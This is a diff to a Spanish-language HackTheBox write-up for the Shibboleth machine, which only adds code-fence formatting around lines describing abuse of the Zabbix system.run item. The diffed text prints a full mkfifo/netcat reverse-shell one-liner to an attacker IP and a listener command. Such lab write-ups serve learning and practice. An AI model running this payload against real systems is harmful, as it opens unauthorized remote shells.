@@ -335,12 +335,20 @@ en nuesto caso nos interesa **`Items`**, le damos click y creamos un nuevo item 
 ![CreateItem](/assets/images/hackthebox/machines/shibboleth/createitem.png)
 
 En el boton Select elegimos de la lista desplegable la opción **`system.run`**, esta consta de dos opciones:
-> system.run[command,<mode>]
+{% raw %}
+~~~html
+system.run[command,<mode>]
+~~~
+{% endraw %}
 
 Tenemos dos posibles modos, **`wait`** y **`nowait`**, pero hay que tener en cuenta que la primera provoca que la conexión no sea estable,
 así que elegimos la segunda y nos quedará de esta forma nuestro comando:
 
+{% raw %}
+~~~html
 system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.29 9999 >/tmp/f,nowait]
+~~~
+{% endraw %}
 
 Ahora nos ponemos en escucha con **`nc -nlvp 9999`** y finalmente le damos al botón **`Test`** y **`Get value`** para obtener nuestra shell:
 
